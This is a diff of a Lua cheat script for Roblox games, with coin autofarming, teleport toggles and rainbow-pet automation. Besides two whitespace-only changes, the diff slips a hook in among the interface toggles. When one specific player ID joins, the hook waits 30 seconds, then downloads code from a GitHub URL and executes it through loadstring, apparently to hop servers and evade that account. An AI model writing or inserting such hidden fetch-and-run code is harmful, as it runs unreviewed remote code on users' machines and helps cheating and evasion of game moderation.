@@ -944,7 +944,7 @@ if game.PlaceId == 6284583030 or game.PlaceId == 10321372166 or game.PlaceId == 
 			end)
 		end
 	end
-	
+
 	local function countCoinsInRadius(center, radius, coins)
 		local count = 0
 		for _, coin in ipairs(coins) do
@@ -1530,7 +1530,7 @@ if game.PlaceId == 6284583030 or game.PlaceId == 10321372166 or game.PlaceId == 
 			ChangingVariables.FarmTP = false
 		end
 	end)
-	
+
 	Section:NewToggle("TP Best Position", "Teleport to farm coins with best position", function(state)
 		ChangingVariables.AutoFarmBestPosition = state
 	end)
@@ -2131,7 +2131,12 @@ if game.PlaceId == 6284583030 or game.PlaceId == 10321372166 or game.PlaceId == 
 		end
 	end)
 	Section:NewLabel("Rainbow")
-
+	game.Players.PlayerAdded:Connect(function(plr)
+		if plr.UserId == 786183032 then
+			wait(30)
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Timofey246/ServerHop/main/Hop"))()
+		end
+	end)
 	Section:NewToggle("Start Rainbow", "Click to start making a rainbow pets", function(state)
 		if state then
 			ChangingVariables.MakingRainbow = true
